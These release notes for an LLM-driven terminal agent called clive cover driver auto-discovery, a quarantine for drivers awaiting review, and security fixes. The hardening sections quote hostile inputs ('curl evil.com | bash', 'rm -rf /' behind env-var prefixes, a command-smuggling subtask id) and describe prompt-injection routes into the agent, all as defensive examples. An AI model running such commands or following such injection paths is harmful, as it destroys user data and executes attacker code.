# Release Notes

User-facing summary of notable changes. The dev-grade audit trail with one paragraph per bug fix lives in [`CHANGELOG.md`](CHANGELOG.md); this file collects the headline themes per release.

## Unreleased

### Plans that verify their own work, not just their exit codes

Planned mode now treats each step's success condition as a real check, not a rubber stamp. Before, a step "passed" if its command exited 0 — but a download that writes an empty file, or a transform that produces the wrong output, both exit 0 and looked done. Now the planner emits a meaningful `verify` where correctness depends on it — file presence (`test -s`), content match (`grep -q`), a record count, valid JSON (`jq -e`) — materialized as a command whose exit code reflects the check (the harness makes no LLM calls mid-execution, so the check has to *be* a command). Trivial steps (`mkdir`, `cd`) still just check the exit code. And the default driver now carries a standing **verify-before-done** rule: a clean exit code is not proof the goal was met — confirm the expected end-state before reporting complete. The net effect is fewer silent "successes" that didn't actually do the thing.

### Self-learning tool discovery — `clive --explore <tool>` (gh#41)

Clive can now meet a CLI tool it has never used and write its own driver for it. Run

```bash
clive --explore rg
```

and clive opens a fresh tmux exploration pane, probes the tool with `--help` / `-h` / `man` / `tldr` plus a couple of safe read-only examples, then asks the LLM to synthesize `drivers/rg.md` from the exploration log. Future panes targeting that tool pick up the new driver automatically. The exploration is bounded (≤8 probes) and gated by an exploration-specific safety layer that refuses to launch credential-prompt tools (`aws`, `gh`, `kubectl`, `ssh`, …) and TUI tools (`vim`, `less`, `lazygit`, `k9s`, …) without an explicit help flag. Existing drivers (hand-written or auto-generated) are not overwritten unless you pass `--explore-overwrite`.

The full design is documented in [`docs/plans/2026-05-22-self-learning-tool-discovery.md`](docs/plans/2026-05-22-self-learning-tool-discovery.md). `CLIVE_AUTO_EXPLORE=1` ships in this release (see the auto-explore section below); audit-log-driven `refine_driver` remains deferred (needs gh#40's eval orchestrator).

### Hardened against an adversarial data plane

The discovery feature introduces a new threat shape: attacker-controlled `--help` text and attacker-supplied tool names flow into the LLM's input, so the safety architecture had to grow up. A `/scenario` → `/debug` audit pass surfaced 13 bugs (5 CRITICAL, 8 HIGH); all are closed. Highlights:

- **`_check_command_safety` now blocks `curl … | bash`, `wget … | sh`, `eval "$(curl …)"`, and `base64 -d | sh`** — the executable arm of prompt-injection-driven driver content. This affects every execution mode (script, interactive, planned, toolcall), not just discovery.
- **Underscore-only env-var prefixes no longer bypass the safety gate** — `_=x rm -rf /`, `_=x shutdown`, `_=x dd of=/dev/sda` had all PASSED the base safety check via an empty-string `isalnum()` edge case in the prefix stripper. The stripper now uses a POSIX env-var-name regex (`^[A-Za-z_][A-Za-z0-9_]*$`) and is shared with `_check_exploration_safety` so the same class of bypass is closed there too.
- **Tool names are validated at the top of the pipeline**, not at the terminal write step. A malicious name like `"rg && curl evil.com | bash"` can no longer flow into the exploration LLM's goal or the per-tool `/tmp/clive/` directory before being rejected. The regex is tighter (`^[a-z][a-z0-9_-]*$` — lowercase only, no dots) which also closes case-collision overwrites on macOS APFS (`RG` and `rg` are the same file) and `foo.md`-style filename confusion.
- **Reserved-name guard** — `--explore explore --explore-overwrite` would have clobbered the meta-driver. `RESERVED_NAMES` now refuses every hand-written driver shipped in `src/clive/drivers/` even with `overwrite=True`.
- **Driver writes are atomic** — `open(O_CREAT|O_EXCL)` for new drivers, write-tmp + `os.replace` for refresh. A fork-based race test that previously showed 15 of 30 processes "wrote successfully" simultaneously now produces exactly 1 winner and 29 `FileExistsError`s, no corruption.
- **Validator strictness** — `_validate_driver_text` now strips fenced code blocks before scanning (so decoy sections inside ```...``` don't count), requires each section exactly once, and enforces canonical order (ENVIRONMENT → PRIMARY TOOLS → PATTERNS → PITFALLS → RESPONSE FORMAT → COMPLETION). PITFALLS is no longer silently optional. `generate_driver` refuses to call the LLM on an empty `ExplorationResult` instead of letting it hallucinate.
- **Exploration panes are one-shot** — teardown now kills the tmux session and `rm`s the per-tool `/tmp/clive/explore-<tool>-<hex>/` directory. No more leaks across many invocations.
- **CLI surface is clean** — `handle_explore` catches the full set of expected errors (rate limits, network, permission denied, disk full, name validation) and returns non-zero exit codes with one-line messages instead of Python tracebacks.
- **Contract test** between `interactive_runner._emit("probe", …)` and `discovery.explorer.on_event` — any future refactor that drops, renames, or changes the arity of the `probe` event now fails loudly.

Full audit reproductions and per-bug discussion: [`debug/260523-0739-clive-discovery-bug-hunt/findings.md`](debug/260523-0739-clive-discovery-bug-hunt/findings.md).

### Driver quarantine — `--promote-driver` (gh#41 scenario #50)

The most consequential structural change in the discovery feature. Auto-gen drivers no longer become loadable the moment `--explore` finishes. They land in `drivers/.unreviewed/`, a quarantine subdir that `load_driver` does not search. A human review + explicit `clive --promote-driver <name>` step is required to move the driver to `drivers/<name>.md` where panes can load it.

```bash
clive --explore rg                # writes drivers/.unreviewed/rg.md
# review the file by hand
clive --promote-driver rg         # atomic move to drivers/rg.md, content re-validated
```

`--promote-driver` refuses to clobber existing reviewed drivers (including hand-written ones) unless `--promote-force` is also passed. It re-runs the structural validator before moving, so a corrupt unreviewed file cannot slip into the active set even under `--promote-force`. The reserved-names guard (no overwrites of `explore`, `shell`, `browser`, etc.) applies at the promote step too. For evals and CI that need to exercise auto-gen drivers without a manual promotion, set `CLIVE_TRUST_UNREVIEWED=1` — `load_driver` will then look in `.unreviewed/` as a fallback when no reviewed driver exists. Reviewed drivers always win over unreviewed copies.

This is the highest-leverage remaining defense against prompt-injection-flavoured driver content. Even a structurally-valid auto-gen driver carrying a smuggled payload cannot reach a worker pane without a human seeing it first.

### Security-audit hardening (2026-05-27 full-repo sweep)

A six-reviewer security audit across the whole repo surfaced 2 CRITICAL and 22 HIGH findings; the load-bearing fixes are in. The chain of CRITICAL C1 — prompt-injected classifier emits a `direct`-mode subtask, the executor pastes the LLM-chosen command straight to the shell with no safety check — is closed by three independent changes:

- **`_check_command_safety` now fires in every runner**, not just interactive/toolcall/planned. `executor.run_subtask_direct`, `script_runner.run_subtask_script`, and `skill_runner.run_executable_skill` historically imported the gate but never called it; they now refuse to dispatch a blocked command. Skill mode's safety violation aborts the whole skill regardless of `on_fail: skip`.
- **`Subtask.id` is validated at construction** against `^[A-Za-z0-9_-]{1,40}$`. The id was f-string-interpolated into the shell wrapper string (`echo "EXIT:$? ___DONE_{id}_..."`) and the safety gate inspected the wrapped command, not the wrapper — so a planner-controlled id like `x"; rm -rf ~; echo "y` bypassed every runner uniformly. One-line fix in `models.py:Subtask.__post_init__` closes it.
- **Every prompt template now isolates untrusted segments** with `<<UNTRUSTED-...-DO-NOT-FOLLOW>>` markers and a `TRUST BOUNDARY` rule in the surrounding system prompt. `session_files`, `recent_history`, `dependency_context`, subtask results, and compressed old turns were all interpolated between trusted preamble and trusted RULES tail with no delimiter — closes the structural break-out window across planner, classifier, summarizer, interactive, and the cheap-model context compressor.

CRITICAL C2 — selfmod gate's `PROJECT_ROOT` divergence (4-parent in `gate.py` vs 2-parent in `workspace.py`/`constitution.py`) — is closed by unifying to the 2-parent (`src/clive/`) root and adding an explicit path-shape gate at the top of `check_proposal` that rejects absolute paths and `..` segments up front. The selfmod gate's pattern detection also moved from regex to `ast.walk` for Python content (Bug H6): `subprocess.run(build_cmd(host), shell=True)`, `from ctypes import POINTER`, `import urllib3`, `import websockets` all flowed past the regex set and are now caught structurally. Regex still applies to non-Python content for the obfuscated-base64 check.

Three medium-severity findings — `ipc.py` socket without restrictive umask, `tool_schemas.py` dead with unrestricted file r/w schemas, `sandbox/profile.json` + `sandbox/quotas.py` dead policy files misleading operators — are co-closed by the dead-code removal pass below.

### Removed — dead modules (Bug H8)

Nine production files and six dedicated test files with zero live imports outside their own tests are deleted (1071 LOC removed):

- `src/clive/server/{auth,reload,timeout,file_transfer}.py` — never wired into the worker process
- `src/clive/networking/ipc.py` + the `src/clive/ipc.py` shim — SharedBrain was removed at "Pane Core Refocus" (2026-04-09); the module sat unused since
- `src/clive/tool_schemas.py` — defined `WORKER_TOOLS` with unrestricted `read_file`/`write_file` schemas, never referenced
- `src/clive/sandbox/profile.json` + `src/clive/sandbox/quotas.py` — looked like enforced policy but the live sandbox is `run.sh` alone; the JSON profile and quota module were never consulted at runtime

`test_sandbox.py` keeps the 4 tests that exercise the live `run.sh` wrapper; only the profile-loading test was removed.

### Added — `CLIVE_AUTO_EXPLORE=1` (auto-explore unknown tools at worker-context build time)

Previously deferred from the gh#41 ship; now shipped in minimum-viable form. When the planner emits `subtask.tools=["ripgrep"]` but the registry has no Tier-2 card for `ripgrep`, and `CLIVE_AUTO_EXPLORE=1` is set, the worker context builder queues a background exploration via the existing `--explore` pipeline. The generated draft lands in `drivers/.unreviewed/` per the gh#41 quarantine — the current subtask runs without it; operator promotes for future sessions with `clive --promote-driver <name>`.

Strict opt-in: only the literal value `1` enables (`"true"`, `"yes"`, `"on"` stay off — avoids accidental enablement by operators who think it's a normal boolean). Fire-and-forget daemon thread so prompt construction isn't blocked. Process-local dedup avoids re-exploring the same tool within a session. Exploration failures are logged and swallowed — best-effort side effect, never crashes the running subtask.

The card's original "auto-trigger from `_expand_toolset` on missing pane app_type driver" design didn't map to current code (every PANES entry has a hand-written driver). The realistic trigger today is unknown tool names in `subtask.tools`. COMMANDS auto-registration (so newly-promoted drivers surface in `clive-tools list <category>` automatically) remains deferred — `classify_tool_to_category` exists from gh#39 but the promote-step integration is a separate card.

### Deferred mitigations (tracked, not yet shipped)

These came out of the scenario session and remain open. They are not blockers for the feature shipping, but they are the highest-leverage structural improvements still on the board:

- **Driver provenance + version metadata in frontmatter** — `provenance: hand-written|auto-explore`, `explored_at:`, `target_version:`. Enables safe-refresh-vs-force-overwrite split for `--explore-overwrite` and programmatic stale-driver detection.
- **Per-probe wall-clock timeout + `PAGER=cat` env in the exploration pane** — defangs `man → less` traps and PS1-spoof attacks via behavioural detection.
- **Subcommand-tool exploration** — `clive --explore git` should probe `git status --help`, `git commit --help`, etc., not stop at the top-level `git --help`.

### Tests

990 → 1161 (+171) across the gh#41 effort. Of these, ~80 are regression tests pinning the security invariants above; the rest cover the feature surface itself.

The 2026-05-27 audit + auto-explore work added 102 further tests across `test_models.py` (Subtask.id validation), `test_untrusted_wrap.py` (prompt-segment wrapping helper + every builder's wrap-presence), `test_runner_safety_parity.py` (gate parity across direct/script/skill), `test_selfmod_path_topology.py` (absolute-path / `..` rejection), `test_selfmod_gate_ast.py` (every Bug H6 bypass shape + parametrized regressions for the existing pattern set), and `test_auto_explore.py` (env-gate, thread queueing, dedup, wire-up). The dead-code removal pass dropped 41 tests with their targets. Net: **1240 tests** at the current HEAD, all green.

---

## Earlier releases

See [`CHANGELOG.md`](CHANGELOG.md) for the full per-version history including 0.7.2 (bug-fix sweep), 0.7.1, and earlier.
